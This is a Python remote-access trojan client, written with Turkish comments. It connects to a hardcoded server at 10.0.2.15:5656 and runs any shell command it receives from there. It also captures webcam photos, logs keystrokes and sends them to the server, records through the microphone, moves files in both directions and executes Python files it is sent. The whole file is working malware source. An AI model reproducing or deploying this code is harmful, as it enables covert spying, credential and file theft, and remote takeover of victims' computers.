
import socket
import subprocess
import sys
import os
import cv2
import time
from pynput import keyboard
from gtts import gTTS
import speech_recognition as sr

def start_client(server_address, server_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client_socket.connect((server_address, server_port))
        print("Bağlantı başarılı!")
    except Exception as e:
        print(f"Bağlantı hatası: {e}")
        sys.exit(1)

    try:
        while True:
            command = client_socket.recv(4096).decode('utf-8')

            if command.lower() == 'exit':
                break
            else:
                execute_command(command, client_socket)

    except KeyboardInterrupt:
        print("Program kapatılıyor...")
    except Exception as e:
        print(f"Hata: {e}")
    finally:
        client_socket.close()

def execute_command(command, client_socket):
    try:
        if command.startswith('mikrofon-dinle'):
            receive_audio(client_socket)
        elif command.startswith('foto-cek'):
            take_photo_and_send(client_socket)
        elif command.startswith("keylogger"):
            keylogger(client_socket)
        elif command.startswith('dosya-gonder'):
            file_path = command.split()[1]
            send_file(client_socket, file_path)
        elif command.startswith('dosya-al'):
            file_name = command.split()[1]
            receive_file(client_socket, file_name)
        elif command.startswith('dosya-calistir'):
            file_name = command.split()[1]
            execute_file(file_name)
        else:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output, error = process.communicate()

            if output:
                client_socket.send(output)
            elif error:
                client_socket.send(error)
            else:
                client_socket.send("".encode('utf-8'))
    except Exception as e:
        print(f"Komut çalıştırma hatası: {e}")

def receive_audio(client_socket):
    try:
        # Server'a mikrofon dinleme komutunu gönder
        client_socket.send('mikrofon-dinle'.encode('utf-8'))

        # Ses dosyasını al
        audio_data = client_socket.recv(4096)

        # Ses dosyasını tanıma ve ses dosyasına çevirme
        recognize_and_speak(audio_data)
    except Exception as e:
        print(f"Ses dosyası alma hatası: {e}")

def recognize_and_speak(audio_data):
    try:
        # Ses dosyasını geçici bir dosyaya kaydet
        with open("received_audio.mp3", "wb") as audio_file:
            audio_file.write(audio_data)

        # Ses dosyasını tanıma ve metin çıkartma
        r = sr.Recognizer()
        with sr.AudioFile("received_audio.mp3") as source:
            audio_text = r.recognize_google(r.record(source), language="tr-TR")
            print(f"Tanınan metin: {audio_text}")

        # Tanınan metni ses dosyasına çevir
        tts = gTTS(text=audio_text, lang="tr")
        tts.save("output_audio.mp3")

        # Ses dosyasını server'a gönder
        send_file(client_socket, "output_audio.mp3")
    except Exception as e:
        print(f"Ses tanıma ve dönüştürme hatası: {e}")

def take_photo_and_send(client_socket):
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        print("Kamera başlatılamadı!")
        return

    ret, frame = cap.read()
    cap.release()

    if ret:
        timestamp = time.time()
        photo_name = f"photo.jpg"
        cv2.imwrite(photo_name, frame)

        with open(photo_name, 'rb') as photo_file:
            photo_data = photo_file.read()
            client_socket.send(photo_data)
    else:
        print("Fotoğraf çekilemedi!")

def keylogger(client_socket):
    def on_press(key):
        try:
            key_char = key.char
        except AttributeError:
            key_char = f"Special key {key}"

        with open("log.txt", "a") as f:
            f.write(f"{key_char}
")

        # Tuş vuruşlarını server'a gönder
        client_socket.send(key_char.encode('utf-8'))

    def exit_program():
        print("Program will exit in 30 seconds.")
        time.sleep(30)
        return False

    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except Exception as e:
            print(f"Hata: {e}")

    exit_program()

def send_file(client_socket, file_path):
    try:
        with open(file_path, 'rb') as file:
            file_data = file.read()
            file_name = os.path.basename(file_path)
            file_size = len(file_data)

            # Dosya bilgilerini server'a gönder
            client_socket.send(f'dosya-gonder {file_name} {file_size}'.encode('utf-8'))
            response = client_socket.recv(4096).decode('utf-8')

            if response.lower() == 'ok':
                # Dosya verisini server'a gönder
                client_socket.send(file_data)
                print(f"{file_name} dosyası başarıyla gönderildi.")
            else:
                print("Dosya gönderme başarısız.")
    except Exception as e:
        print(f"Dosya gönderme hatası: {e}")

def receive_file(client_socket, file_name):
    try:
        # Server'a dosya alma komutunu gönder
        client_socket.send(f'dosya-al {file_name}'.encode('utf-8'))

        response = client_socket.recv(4096).decode('utf-8')
        if response.lower() == 'ok':
            file_data = client_socket.recv(4096)

            with open(file_name, 'wb') as file:
                file.write(file_data)

            print(f"{file_name} dosyası başarıyla alındı.")
        else:
            print(f"{file_name} dosyası alınamadı.")
    except Exception as e:
        print(f"Dosya alma hatası: {e}")

def execute_file(file_name):
    try:
        subprocess.Popen(['python', file_name], shell=True)
    except Exception as e:
        print(f"Dosya çalıştırma hatası: {e}")
	
server_address = '10.0.2.15'
server_port = 5656
start_client(server_address,server_port)